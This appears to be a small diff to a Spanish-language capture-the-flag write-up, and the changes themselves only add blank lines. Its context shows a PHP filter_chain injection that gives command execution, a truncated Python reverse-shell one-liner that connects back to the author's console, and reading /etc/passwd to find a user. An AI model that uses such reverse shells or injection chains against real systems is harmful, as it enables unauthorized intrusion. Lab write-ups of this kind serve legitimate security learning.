@@ -101,6 +101,7 @@ b) ***Para obtener una lista con posibles contraseña para el usuario "Jessica C
 ![](ANEXOS/Pasted%20image%2020241011085843.png)
 
 ***El `filter_chain` es mas extenso pero así quedaría para inyectarlo directamente al navegador.***
+
 ![](ANEXOS/Pasted%20image%2020241011090029.png)
 
 ***Ya tengo ejecución de comandos ***
@@ -112,6 +113,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
  ```
  
  y en mi consola obtengo la conexión.
+ 
 ![](ANEXOS/Pasted%20image%2020241011090521.png)
 	 
 ### 18) Luego del tratamiento de la tty, listo el contenido del escritorio donde estoy ubicado y también listo la carpeta /home, en el cual encontré una carpeta jessica del que creo que es un usuario de sistema entonces realizo un cat al archivo /etc/passwd y encuentro al usuario.
